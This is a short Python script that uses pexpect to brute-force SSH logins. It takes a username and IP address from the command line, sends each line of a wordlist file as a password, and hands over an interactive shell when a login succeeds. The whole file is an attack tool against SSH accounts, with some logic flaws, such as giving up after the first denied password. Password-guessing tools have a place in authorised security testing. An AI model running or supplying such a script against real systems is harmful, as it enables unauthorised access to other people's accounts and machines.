import pexpect
import sys
import ipaddress

def process_wordlist(filepath, shell):
    fd = open(filepath, 'r')
    for line in fd:
        print("trying password:", line)
        shell.sendline(line)
        response = shell.expect(['#\$', '(yes/no)?', '[Tt]erminal type', '[Pp]ermission denied'], timeout=5)
        if response == 0:
            return shell
        if response == 1:
            print('Continue connecting to unknown host')
            shell.sendline('yes')
            shell.expect('[#\$] ')
            return shell
        if response == 2:
            print('Login OK... need to send terminal type.')
            shell.sendline('vt100')
            shell.expect('[#\$] ')
        if response == 3:
            print('Permission denied on host. Can\'t login')
            return None

    return None

def is_valid_ip(ip_addr):
    # Validate that ip address is valid.
        try:
            ipaddress.ip_address(ip_addr)
            return True
        except:
            print("Not a valid ip")
            return False

def connect_ssh_session(hostname, ip_addr):
    target = "ssh " + hostname + "@" + ip_addr
    print('target=', target)
    shell = pexpect.spawn(target)
    shell.expect('[Pp]assword:')
    print(shell.after)

    return process_wordlist('./test_file', shell)


if __name__=='__main__':


    hostname = sys.argv[1]
    ip_addr = sys.argv[2]

    if not is_valid_ip(ip_addr):
        print("This is not a valid ip")
        exit()

    connection = connect_ssh_session(hostname, ip_addr)

    if connection is not None:
        connection.interact()

    exit()

